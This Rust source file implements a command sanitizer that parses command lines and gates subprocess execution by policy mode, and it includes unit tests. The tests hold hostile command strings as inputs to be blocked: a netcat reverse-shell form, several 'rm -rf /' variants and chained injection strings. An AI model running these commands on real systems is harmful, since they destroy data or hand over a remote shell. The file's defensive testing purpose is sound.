use std::sync::Arc;

use crate::config::{ShellExecutionMode, WflConfig};

/// Result of command validation
#[derive(Debug, PartialEq)]
pub enum ValidationResult {
    /// Command is safe and doesn't need shell
    Safe,
    /// Command requires shell features
    RequiresShell {
        reason: String,
        warnings: Vec<String>,
    },
    /// Command is blocked by security policy
    Blocked { reason: String },
}

/// Command sanitizer for subprocess security
pub struct CommandSanitizer {
    config: Arc<WflConfig>,
}

impl CommandSanitizer {
    pub fn new(config: Arc<WflConfig>) -> Self {
        Self { config }
    }

    /// Parse a command string into program and arguments
    ///
    /// Supports shell-like quoting and escaping:
    /// - Double quotes ("...") preserve spaces and support escapes (\n, \t, \r, \\, \", \0)
    /// - Single quotes ('...') preserve everything literally (no escape processing)
    /// - Backslash (\) outside quotes escapes the next character
    ///
    /// Returns error for unclosed quotes, trailing escapes, or empty commands
    ///
    /// Example: "echo hello world" -> ("echo", ["hello", "world"])
    /// Example: "grep 'hello world' file.txt" -> ("grep", ["hello world", "file.txt"])
    pub fn parse_command(command: &str) -> Result<(String, Vec<String>), String> {
        let trimmed = command.trim();
        if trimmed.is_empty() {
            return Err("Empty command".to_string());
        }

        #[derive(Debug, Clone, Copy, PartialEq)]
        enum State {
            Normal,         // Outside quotes
            InDoubleQuote,  // Inside "..."
            InSingleQuote,  // Inside '...'
            Escape,         // After backslash outside quotes
            EscapeInDouble, // After backslash inside double quotes
        }

        let mut parts = Vec::new();
        let mut current = String::new();
        let mut state = State::Normal;
        let mut in_quoted_context = false; // Track if we just closed quotes (for empty strings)

        for ch in trimmed.chars() {
            match state {
                State::Normal => match ch {
                    '"' => {
                        state = State::InDoubleQuote;
                        in_quoted_context = true;
                    }
                    '\'' => {
                        state = State::InSingleQuote;
                        in_quoted_context = true;
                    }
                    '\\' => state = State::Escape,
                    ' ' | '\t' => {
                        if !current.is_empty() || in_quoted_context {
                            parts.push(current.clone());
                            current.clear();
                            in_quoted_context = false;
                        }
                    }
                    _ => {
                        current.push(ch);
                        in_quoted_context = false;
                    }
                },

                State::InDoubleQuote => match ch {
                    '"' => state = State::Normal,
                    '\\' => state = State::EscapeInDouble,
                    _ => current.push(ch),
                },

                State::InSingleQuote => match ch {
                    '\'' => state = State::Normal,
                    _ => current.push(ch), // Single quotes preserve everything literally
                },

                State::Escape => {
                    current.push(ch); // Backslash outside quotes escapes next char
                    state = State::Normal;
                    in_quoted_context = false;
                }

                State::EscapeInDouble => {
                    // Handle escape sequences in double quotes
                    match ch {
                        'n' => current.push('\n'),
                        't' => current.push('\t'),
                        'r' => current.push('\r'),
                        '\\' => current.push('\\'),
                        '"' => current.push('"'),
                        '0' => current.push('\0'),
                        _ => {
                            current.push('\\');
                            current.push(ch);
                        }
                    }
                    state = State::InDoubleQuote;
                }
            }
        }

        // Check for unclosed quotes or trailing escape
        match state {
            State::InDoubleQuote => return Err("Unclosed double quote".to_string()),
            State::InSingleQuote => return Err("Unclosed single quote".to_string()),
            State::Escape | State::EscapeInDouble => {
                return Err("Trailing escape character".to_string());
            }
            State::Normal => {
                if !current.is_empty() || in_quoted_context {
                    parts.push(current);
                }
            }
        }

        if parts.is_empty() {
            return Err("No program specified".to_string());
        }

        let program = parts[0].clone();
        let args = parts[1..].to_vec();

        Ok((program, args))
    }

    /// Check if command contains shell metacharacters
    pub fn contains_shell_metacharacters(command: &str) -> bool {
        const SHELL_METACHARACTERS: &[char] = &[
            ';', '|', '&', '<', '>', '$', '`', '(', ')', '{', '}', '[', ']', '*', '?', '~', '!',
            '\\', '\n', '\r',
        ];

        // Check for metacharacters
        for ch in SHELL_METACHARACTERS {
            if command.contains(*ch) {
                return true;
            }
        }

        // Check for command substitution patterns
        if command.contains("$(") || command.contains("${") {
            return true;
        }

        false
    }

    /// Authorize any subprocess launch (shell path or direct-exec).
    ///
    /// This is the single policy gate used before `Command::new` on both the
    /// execute-command and spawn-process paths. Defaults deny all process
    /// execution (`allow_shell_execution = false` and/or
    /// `shell_execution_mode = forbidden`).
    pub fn authorize_process_execution(
        &self,
        program: &str,
        needs_shell: bool,
        command_for_analysis: &str,
    ) -> Result<ValidationResult, String> {
        // Master switch: when false, all subprocess execution is blocked.
        if !self.config.allow_shell_execution {
            return Ok(ValidationResult::Blocked {
                reason: "Subprocess execution is disabled (allow_shell_execution = false)"
                    .to_string(),
            });
        }

        match self.config.shell_execution_mode {
            ShellExecutionMode::Forbidden => Ok(ValidationResult::Blocked {
                reason: "Subprocess execution is disabled by security policy \
                         (shell_execution_mode = forbidden)"
                    .to_string(),
            }),
            ShellExecutionMode::AllowlistOnly => {
                // An allowlist can authorize one executable, but it cannot
                // safely authorize an entire shell command line. If shell
                // parsing is allowed here, a command such as
                // `echo safe; unlisted-program` passes the `echo` check and the
                // shell executes both commands. Require the argv/direct-exec
                // form in this mode; callers that intentionally need pipes,
                // redirects, expansion, or chaining must opt into `sanitized`
                // or `unrestricted` explicitly.
                if needs_shell {
                    return Ok(ValidationResult::Blocked {
                        reason: "Shell features are not permitted in allowlist_only mode; use the direct-exec form with an explicit argument list"
                            .to_string(),
                    });
                }

                if self.is_program_allowlisted(program) {
                    Ok(ValidationResult::Safe)
                } else {
                    Ok(ValidationResult::Blocked {
                        reason: format!(
                            "Program '{}' is not in the allowlist (allowed_shell_commands)",
                            program
                        ),
                    })
                }
            }
            ShellExecutionMode::Sanitized => {
                if needs_shell {
                    let warnings = self.analyze_shell_features(command_for_analysis);
                    Ok(ValidationResult::RequiresShell {
                        reason: "Command contains shell features".to_string(),
                        warnings,
                    })
                } else {
                    Ok(ValidationResult::Safe)
                }
            }
            ShellExecutionMode::Unrestricted => {
                if needs_shell {
                    Ok(ValidationResult::RequiresShell {
                        reason: "Unrestricted shell mode enabled".to_string(),
                        warnings: vec!["⚠️ Using unrestricted shell execution".to_string()],
                    })
                } else {
                    Ok(ValidationResult::Safe)
                }
            }
        }
    }

    /// Validate a full command string against security policy.
    ///
    /// Resolves the program name from the command string and delegates to
    /// [`authorize_process_execution`]. Kept for callers that only have the
    /// raw command line.
    pub fn validate_command(&self, command: &str) -> Result<ValidationResult, String> {
        let has_shell_features = Self::contains_shell_metacharacters(command);
        let program = match Self::parse_command(command) {
            Ok((prog, _)) => prog,
            Err(_) => self.get_command_base(command),
        };
        self.authorize_process_execution(&program, has_shell_features, command)
    }

    /// Check if a program (or command string) is in the allowlist
    pub fn is_allowlisted(&self, command: &str) -> bool {
        if Self::contains_shell_metacharacters(command) {
            return false;
        }
        let program = Self::parse_command(command)
            .map(|(program, _)| program)
            .unwrap_or_else(|_| self.get_command_base(command));
        self.is_program_allowlisted(&program)
    }

    fn is_program_allowlisted(&self, program: &str) -> bool {
        let program_has_path = Self::has_path_syntax(program);
        self.config.allowed_shell_commands.iter().any(|allowed| {
            let allowed_has_path = Self::has_path_syntax(allowed);

            // A name-only entry delegates resolution to the trusted process
            // environment's PATH. It must not also authorize a caller-selected
            // executable at `./name`, `/tmp/name`, or another explicit path.
            if program_has_path != allowed_has_path {
                return false;
            }
            if program_has_path {
                let Ok(program_path) = std::fs::canonicalize(program) else {
                    return false;
                };
                let Ok(allowed_path) = std::fs::canonicalize(allowed) else {
                    return false;
                };

                #[cfg(windows)]
                {
                    return program_path
                        .to_string_lossy()
                        .eq_ignore_ascii_case(&allowed_path.to_string_lossy());
                }
                #[cfg(not(windows))]
                {
                    return program_path == allowed_path;
                }
            }

            let program_base = Self::program_basename(program);
            let allowed_base = Self::program_basename(allowed);
            #[cfg(windows)]
            {
                allowed_base.eq_ignore_ascii_case(&program_base)
            }
            #[cfg(not(windows))]
            {
                allowed_base == program_base
            }
        })
    }

    fn has_path_syntax(program: &str) -> bool {
        let trimmed = program.trim().trim_matches('"').trim_matches('\'');
        trimmed.contains('/') || trimmed.contains('\\') || trimmed.as_bytes().get(1) == Some(&b':')
    }

    /// Extract the first whitespace-separated token from a command string
    fn get_command_base(&self, command: &str) -> String {
        command.split_whitespace().next().unwrap_or("").to_string()
    }

    /// Basename of a program path (`/bin/echo` → `echo`, `C:\\Windows\\cmd.exe` → `cmd.exe`)
    pub fn program_basename(program: &str) -> String {
        let trimmed = program.trim().trim_matches('"').trim_matches('\'');
        trimmed
            .rsplit(['/', '\\'])
            .next()
            .unwrap_or(trimmed)
            .to_string()
    }

    /// Analyze shell features and provide warnings
    fn analyze_shell_features(&self, command: &str) -> Vec<String> {
        let mut warnings = Vec::new();

        if command.contains(';') {
            warnings.push("Command chaining detected (;)".to_string());
        }
        if command.contains('|') {
            warnings.push("Pipe detected (|)".to_string());
        }
        if command.contains('&') {
            warnings.push("Background execution or AND operator detected (&)".to_string());
        }
        if command.contains('>') || command.contains('<') {
            warnings.push("Redirection detected (< or >)".to_string());
        }
        if command.contains('$') {
            warnings.push("Variable expansion detected ($)".to_string());
        }
        if command.contains("$(") || command.contains('`') {
            warnings.push("Command substitution detected ($(...)  or `...`)".to_string());
        }
        if command.contains('*') || command.contains('?') {
            warnings.push("Glob pattern detected (* or ?)".to_string());
        }

        if warnings.is_empty() {
            warnings.push("Shell features detected".to_string());
        }

        warnings
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::WflConfig;

    fn test_config(mode: ShellExecutionMode) -> Arc<WflConfig> {
        let config = WflConfig {
            allow_shell_execution: true,
            shell_execution_mode: mode,
            ..Default::default()
        };
        Arc::new(config)
    }

    fn default_secure_config() -> Arc<WflConfig> {
        Arc::new(WflConfig::default())
    }

    #[test]
    fn test_parse_command_simple() {
        let (prog, args) = CommandSanitizer::parse_command("echo hello world").unwrap();
        assert_eq!(prog, "echo");
        assert_eq!(args, vec!["hello", "world"]);
    }

    #[test]
    fn test_parse_command_with_quotes() {
        let (prog, args) =
            CommandSanitizer::parse_command(r#"grep "hello world" file.txt"#).unwrap();
        assert_eq!(prog, "grep");
        assert_eq!(args, vec!["hello world", "file.txt"]);
    }

    #[test]
    fn test_parse_command_single_program() {
        let (prog, args) = CommandSanitizer::parse_command("ls").unwrap();
        assert_eq!(prog, "ls");
        assert_eq!(args, Vec::<String>::new());
    }

    #[test]
    fn test_parse_command_empty() {
        assert!(CommandSanitizer::parse_command("").is_err());
        assert!(CommandSanitizer::parse_command("   ").is_err());
    }

    #[test]
    fn test_parse_command_single_quotes() {
        let (prog, args) =
            CommandSanitizer::parse_command(r#"grep 'hello world' file.txt"#).unwrap();
        assert_eq!(prog, "grep");
        assert_eq!(args, vec!["hello world", "file.txt"]);
    }

    #[test]
    fn test_parse_command_mixed_quotes() {
        let (prog, args) =
            CommandSanitizer::parse_command(r#"cmd "arg one" 'arg two' arg3"#).unwrap();
        assert_eq!(prog, "cmd");
        assert_eq!(args, vec!["arg one", "arg two", "arg3"]);
    }

    #[test]
    fn test_parse_command_escaped_double_quote() {
        let (prog, args) = CommandSanitizer::parse_command(r#"echo "say \"hello\"""#).unwrap();
        assert_eq!(prog, "echo");
        assert_eq!(args, vec![r#"say "hello""#]);
    }

    #[test]
    fn test_parse_command_escaped_backslash() {
        let (prog, args) = CommandSanitizer::parse_command(r#"echo "path\\to\\file""#).unwrap();
        assert_eq!(prog, "echo");
        assert_eq!(args, vec![r#"path\to\file"#]);
    }

    #[test]
    fn test_parse_command_escape_outside_quotes() {
        let (prog, args) = CommandSanitizer::parse_command(r#"echo hello\ world"#).unwrap();
        assert_eq!(prog, "echo");
        assert_eq!(args, vec!["hello world"]);
    }

    #[test]
    fn test_parse_command_unclosed_double_quote() {
        let result = CommandSanitizer::parse_command(r#"echo "hello"#);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("Unclosed"));
    }

    #[test]
    fn test_parse_command_unclosed_single_quote() {
        let result = CommandSanitizer::parse_command(r#"echo 'hello"#);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("Unclosed"));
    }

    #[test]
    fn test_parse_command_trailing_backslash() {
        let result = CommandSanitizer::parse_command(r#"echo hello\"#);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("escape"));
    }

    #[test]
    fn test_parse_command_empty_quotes() {
        let (prog, args) = CommandSanitizer::parse_command(r#"echo "" test"#).unwrap();
        assert_eq!(prog, "echo");
        assert_eq!(args, vec!["", "test"]);
    }

    #[test]
    fn test_parse_command_single_quote_no_escapes() {
        // Single quotes preserve everything literally
        let (prog, args) = CommandSanitizer::parse_command(r#"echo 'test\n\t'"#).unwrap();
        assert_eq!(prog, "echo");
        assert_eq!(args, vec![r#"test\n\t"#]);
    }

    #[test]
    fn test_contains_shell_metacharacters() {
        assert!(CommandSanitizer::contains_shell_metacharacters(
            "echo test; rm -rf /"
        ));
        assert!(CommandSanitizer::contains_shell_metacharacters(
            "ls | grep test"
        ));
        assert!(CommandSanitizer::contains_shell_metacharacters(
            "echo $HOME"
        ));
        assert!(CommandSanitizer::contains_shell_metacharacters(
            "cat $(which bash)"
        ));
        assert!(CommandSanitizer::contains_shell_metacharacters(
            "ls > output.txt"
        ));
        assert!(!CommandSanitizer::contains_shell_metacharacters(
            "echo hello world"
        ));
    }

    #[test]
    fn test_default_config_blocks_all_process_execution() {
        let sanitizer = CommandSanitizer::new(default_secure_config());
        // Direct-exec style programs must be blocked under secure defaults
        for cmd in ["echo hello", "sh", "nc -e /bin/sh host 4444"] {
            let result = sanitizer.validate_command(cmd).unwrap();
            assert!(
                matches!(result, ValidationResult::Blocked { .. }),
                "default config must block '{}', got {:?}",
                cmd,
                result
            );
        }
    }

    #[test]
    fn test_authorize_blocks_when_allow_shell_execution_false() {
        let config = WflConfig {
            allow_shell_execution: false,
            shell_execution_mode: ShellExecutionMode::Sanitized,
            ..Default::default()
        };
        let sanitizer = CommandSanitizer::new(Arc::new(config));
        let result = sanitizer
            .authorize_process_execution("echo", false, "echo")
            .unwrap();
        match result {
            ValidationResult::Blocked { reason } => {
                assert!(reason.contains("allow_shell_execution"));
            }
            other => panic!("Expected Blocked, got {:?}", other),
        }
    }

    #[test]
    fn test_authorize_forbidden_blocks_direct_exec() {
        let sanitizer = CommandSanitizer::new(test_config(ShellExecutionMode::Forbidden));
        let result = sanitizer
            .authorize_process_execution("sh", false, "sh")
            .unwrap();
        assert!(matches!(result, ValidationResult::Blocked { .. }));
        let result = sanitizer
            .authorize_process_execution("echo", false, "echo")
            .unwrap();
        assert!(matches!(result, ValidationResult::Blocked { .. }));
    }

    #[test]
    fn test_validate_command_blocked_forbidden() {
        let sanitizer = CommandSanitizer::new(test_config(ShellExecutionMode::Forbidden));
        let result = sanitizer.validate_command("echo $HOME").unwrap();
        assert!(matches!(result, ValidationResult::Blocked { .. }));
        // Forbidden also blocks non-shell direct-exec
        let result = sanitizer.validate_command("echo hello").unwrap();
        assert!(matches!(result, ValidationResult::Blocked { .. }));
    }

    #[test]
    fn test_validate_command_sanitized_direct_exec_safe() {
        let sanitizer = CommandSanitizer::new(test_config(ShellExecutionMode::Sanitized));
        let result = sanitizer.validate_command("echo hello").unwrap();
        assert_eq!(result, ValidationResult::Safe);
    }

    #[test]
    fn test_validate_command_sanitized() {
        let sanitizer = CommandSanitizer::new(test_config(ShellExecutionMode::Sanitized));
        let result = sanitizer.validate_command("echo test | grep t").unwrap();
        match result {
            ValidationResult::RequiresShell { warnings, .. } => {
                assert!(!warnings.is_empty());
                assert!(warnings.iter().any(|w| w.contains("Pipe")));
            }
            _ => panic!("Expected RequiresShell"),
        }
    }

    #[test]
    fn test_validate_command_unrestricted() {
        let sanitizer = CommandSanitizer::new(test_config(ShellExecutionMode::Unrestricted));
        // Use command with actual shell features
        let result = sanitizer.validate_command("rm -rf / && echo done").unwrap();
        assert!(matches!(result, ValidationResult::RequiresShell { .. }));
    }

    #[test]
    fn test_authorize_allowlist_only() {
        let config = WflConfig {
            allow_shell_execution: true,
            shell_execution_mode: ShellExecutionMode::AllowlistOnly,
            allowed_shell_commands: vec!["echo".to_string(), "ls".to_string()],
            ..Default::default()
        };
        let sanitizer = CommandSanitizer::new(Arc::new(config));

        let ok = sanitizer
            .authorize_process_execution("echo", false, "echo")
            .unwrap();
        assert_eq!(ok, ValidationResult::Safe);

        let blocked = sanitizer
            .authorize_process_execution("rm", false, "rm")
            .unwrap();
        assert!(matches!(blocked, ValidationResult::Blocked { .. }));

        // A name-only entry must not authorize a caller-selected path merely
        // because the basename is the same.
        let path_blocked = sanitizer
            .authorize_process_execution("/bin/echo", false, "/bin/echo")
            .unwrap();
        assert!(matches!(path_blocked, ValidationResult::Blocked { .. }));
    }

    #[test]
    fn test_allowlist_path_requires_the_same_executable() {
        let current_executable = std::env::current_exe().expect("current test executable");
        let current_executable = current_executable
            .to_str()
            .expect("test executable path is UTF-8")
            .to_string();
        let config = WflConfig {
            allow_shell_execution: true,
            shell_execution_mode: ShellExecutionMode::AllowlistOnly,
            allowed_shell_commands: vec![current_executable.clone()],
            ..Default::default()
        };
        let sanitizer = CommandSanitizer::new(Arc::new(config));

        assert_eq!(
            sanitizer
                .authorize_process_execution(&current_executable, false, &current_executable)
                .unwrap(),
            ValidationResult::Safe
        );
        let substituted = format!(
            "{}/{}",
            std::env::temp_dir().display(),
            CommandSanitizer::program_basename(&current_executable)
        );
        let result = sanitizer
            .authorize_process_execution(&substituted, false, &substituted)
            .unwrap();
        assert!(matches!(result, ValidationResult::Blocked { .. }));
    }

    #[test]
    fn test_allowlist_only_rejects_shell_features_for_allowlisted_program() {
        let config = WflConfig {
            allow_shell_execution: true,
            shell_execution_mode: ShellExecutionMode::AllowlistOnly,
            allowed_shell_commands: vec!["echo".to_string()],
            ..Default::default()
        };
        let sanitizer = CommandSanitizer::new(Arc::new(config));

        for command in [
            "echo safe; unlisted-program",
            "echo safe | unlisted-program",
            "echo $(unlisted-program)",
            "echo safe > output.txt",
        ] {
            let result = sanitizer.validate_command(command).unwrap();
            assert!(
                matches!(result, ValidationResult::Blocked { .. }),
                "allowlist_only must reject shell-backed command {command:?}, got {result:?}"
            );
        }
    }

    #[test]
    fn test_is_allowlisted() {
        let config = WflConfig {
            allow_shell_execution: true,
            shell_execution_mode: ShellExecutionMode::AllowlistOnly,
            allowed_shell_commands: vec!["echo".to_string(), "ls".to_string()],
            ..Default::default()
        };
        let sanitizer = CommandSanitizer::new(Arc::new(config));

        assert!(sanitizer.is_allowlisted("echo hello"));
        assert!(sanitizer.is_allowlisted("ls -la"));
        assert!(!sanitizer.is_allowlisted("rm -rf /"));
        assert!(!sanitizer.is_allowlisted("echo safe; rm -rf /"));
    }

    #[test]
    fn test_program_basename() {
        assert_eq!(CommandSanitizer::program_basename("echo"), "echo");
        assert_eq!(CommandSanitizer::program_basename("/bin/echo"), "echo");
        assert_eq!(
            CommandSanitizer::program_basename(r"C:\Windows\System32\cmd.exe"),
            "cmd.exe"
        );
    }

    #[test]
    fn test_analyze_shell_features() {
        let sanitizer = CommandSanitizer::new(test_config(ShellExecutionMode::Sanitized));
        let warnings = sanitizer.analyze_shell_features("echo test; ls | grep x > output.txt");

        assert!(warnings.iter().any(|w| w.contains("chaining")));
        assert!(warnings.iter().any(|w| w.contains("Pipe")));
        assert!(warnings.iter().any(|w| w.contains("Redirection")));
    }
}
